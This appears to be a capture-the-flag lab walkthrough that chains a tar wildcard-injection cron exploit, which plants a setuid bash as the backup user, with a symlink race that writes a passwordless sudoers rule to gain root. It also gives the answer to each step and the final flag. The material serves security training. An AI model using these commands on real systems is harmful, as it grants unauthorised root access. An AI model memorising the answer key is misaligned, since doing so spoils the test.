# Cron Chain + Symlink Race (Insane)

## Goal

Chain two weaknesses:

1. tar wildcard injection in a cron job running as `backup`;
2. a root symlink race in report publishing.

Final flag:

```text
FLAG{cron_chain_symlink_race_root}
```

## Platform Session

Open the terminal from the lab platform. The commands below are meant to be executed directly in the provided `student` shell.

## Step 1. Map The Scheduled Tasks

Read cron and inspect the scripts:

```bash
cat /etc/crontab
cat /opt/ops/archive-uploads.sh
cat /opt/ops/publish-report.sh
```

The script executed as `backup` is:

```text
/opt/ops/archive-uploads.sh
```

Submit for step 1:

```text
/opt/ops/archive-uploads.sh
```

## Step 2. Pivot To The `backup` Context

Use tar wildcard option injection in `/srv/portal/uploads`.

```bash
cd /srv/portal/uploads

cat > make-backup-shell.sh <<'EOF'
#!/bin/bash
cp /bin/bash /srv/portal/uploads/.bksh
chmod 4755 /srv/portal/uploads/.bksh
EOF
chmod +x make-backup-shell.sh

touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh make-backup-shell.sh'
```

Wait for the `backup` cron job:

```bash
sleep 70
ls -l /srv/portal/uploads/.bksh
/srv/portal/uploads/.bksh -p
id
```

You should now have an effective `backup` context.

Submit for step 2:

```text
backup
```

## Step 3. Identify The Race Target

From the `backup` shell, inspect the publisher:

```bash
cat /opt/ops/publish-report.sh
```

The vulnerable destination is:

```text
/var/ops/reports/public/latest-report.txt
```

Submit for step 3:

```text
/var/ops/reports/public/latest-report.txt
```

## Step 4. Win The Race And Capture The Flag

Prepare report content that will become a sudoers rule:

```bash
echo 'student ALL=(ALL) NOPASSWD:ALL' > /var/ops/reports/pending/report.txt
```

Race the publisher by replacing the checked file with a symlink:

```bash
cat > /tmp/race.sh <<'EOF'
#!/bin/bash
TARGET="/var/ops/reports/public/latest-report.txt"
while true; do
  rm -f "$TARGET"
  touch "$TARGET"
  rm -f "$TARGET"
  ln -s /etc/sudoers.d/zz-student-race "$TARGET"
done
EOF
chmod +x /tmp/race.sh
/tmp/race.sh &
RACE_PID=$!
sleep 90
kill "$RACE_PID"
```

Return to the normal `student` shell and read the flag:

```bash
exit
sudo cat /root/flag.txt
```

Submit:

```text
FLAG{cron_chain_symlink_race_root}
```
